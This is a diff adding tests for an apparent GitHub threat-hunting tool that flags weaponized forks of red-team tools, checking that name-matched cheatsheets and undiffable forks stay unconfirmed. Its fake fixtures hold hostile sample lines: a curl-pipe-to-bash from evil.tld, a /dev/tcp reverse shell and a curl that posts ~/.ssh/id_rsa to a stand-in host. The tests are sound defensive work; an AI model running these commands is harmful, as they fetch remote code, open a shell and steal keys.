@@ -39,6 +39,14 @@ class FakeClient:
     def get_readme(self, owner, name):
         return "Install: curl http://evil.tld/x | bash\n"  # remote-exec signal
 
+    def get_repo(self, owner, name):
+        return {"default_branch": "main"}
+
+    def compare(self, base_full, base_branch, head_full, head_branch):
+        # Diverged fork whose changed file is setup.sh (where _fake_clone writes
+        # the added weaponization), so a fork's intent delta is diffable here.
+        return {"ahead_by": 3, "files": ["setup.sh"]}
+
 
 def _fake_clone(full_name, dest, *, runner=None):
     dest.mkdir(parents=True, exist_ok=True)
@@ -272,6 +280,63 @@ def test_hunt_confirms_weaponized_red_team_fork(tmp_path):
     hunt(db, _DivergedClient(), TOOLS, run_id="hunt-div", now=utcnow(),
          do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True, clone=_fake_clone)
     assert db.findings_by_status("confirmed")  # weaponization in diverged file
+    db.close()
+
+
+def test_hunt_lineage_name_match_is_breadcrumb(tmp_path):
+    # A repo that merely SHARES a pinned tool's name (a cheatsheet, a re-host, a
+    # name collision like CovenantSQL) is not a fork -> no upstream delta to
+    # judge -> breadcrumb, never pinned, even though its docs carry offensive
+    # example commands that would confirm on a full scan.
+    class NameMatchClient(FakeClient):
+        def list_forks(self, owner, name, per_page=100, sort="newest"):
+            return []
+
+        def search_repositories(self, query, per_page=10):
+            if "sliver" in query.lower():
+                return [{"full_name": "writeups/sliver-cheatsheet",
+                         "owner": {"login": "writeups"},
+                         "html_url": "https://github.com/writeups/sliver-cheatsheet",
+                         "fork": False, "stargazers_count": 5,
+                         "pushed_at": "2026-06-10T00:00:00Z"}]
+            return []
+
+    def clone_cheatsheet(full_name, dest, *, runner=None):
+        dest.mkdir(parents=True, exist_ok=True)
+        (dest / "README.md").write_text(  # offensive EXAMPLES, not weaponization
+            "## Example\nbash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
+            "curl -d @~/.ssh/id_rsa https://x.evil\n", encoding="utf-8")
+        return dest
+
+    db = Database.open(tmp_path / "nm.sqlite")
+    summary = hunt(db, NameMatchClient(), TOOLS, run_id="nm", now=utcnow(),
+                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
+                   clone=clone_cheatsheet)
+    row = db.conn.execute(
+        "SELECT status, detection_method FROM repo_findings WHERE full_name = ?",
+        ("writeups/sliver-cheatsheet",)).fetchone()
+    assert row is not None
+    assert row["detection_method"] == "redteam_lineage"
+    assert row["status"] != "confirmed"            # breadcrumb, NOT pinned
+    assert not db.findings_by_status("confirmed")
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
+    db.close()
+
+
+def test_hunt_lineage_undiffable_fork_is_breadcrumb(tmp_path):
+    # A fork we cannot diff against upstream (compare unavailable) has no
+    # obtainable intent delta -> breadcrumb, NOT an indiscriminate full-scan
+    # confirmation on the tool's own offensive code.
+    class NoCompareClient(FakeClient):
+        def compare(self, *a, **k):
+            raise RuntimeError("compare unavailable (rate limited)")
+
+    db = Database.open(tmp_path / "nc.sqlite")
+    summary = hunt(db, NoCompareClient(), TOOLS, run_id="nc", now=utcnow(),
+                   do_ioc=False, do_lineage=True, do_actor=False, do_tier2=True,
+                   clone=_fake_clone)
+    assert not db.findings_by_status("confirmed")
+    assert summary["counts"]["redteam_breadcrumbs"] >= 1
     db.close()
 
 
